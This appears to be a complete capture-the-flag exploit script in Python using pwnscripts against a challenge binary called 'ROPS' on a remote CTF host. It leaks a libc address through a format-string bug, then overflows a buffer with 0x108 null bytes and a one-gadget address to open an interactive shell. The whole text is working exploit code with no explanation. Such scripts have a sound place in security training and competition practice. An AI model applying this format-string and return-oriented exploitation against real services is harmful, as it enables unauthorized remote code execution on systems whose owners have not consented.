from pwnscripts import *
context.binary = 'ROPS'
def start(s: bytes):
    r = remote('ctf-4q22.balancedcompo.site', 9995)
    r.sendafter('name:', s)
    r.recvline()
    return r, r.recvline()
@context.quiet
def printf(s: bytes):
    r, recv = start(s)
    r.close()
    return recv

context.libc_database = 'libc-database'
context.libc = 'libc.so.6'
libc_off = fsb.find_offset.libc(printf, offset=context.libc.symbols['__libc_start_main_ret']&0xfff)

r, leak = start('%{}$p\n'.format(libc_off))
context.libc.symbols['__libc_start_main_ret'] = unpack_hex(leak)

r.sendlineafter('Message:', b'\0'*0x108 + pack(context.libc.select_gadget(0)))
r.interactive()
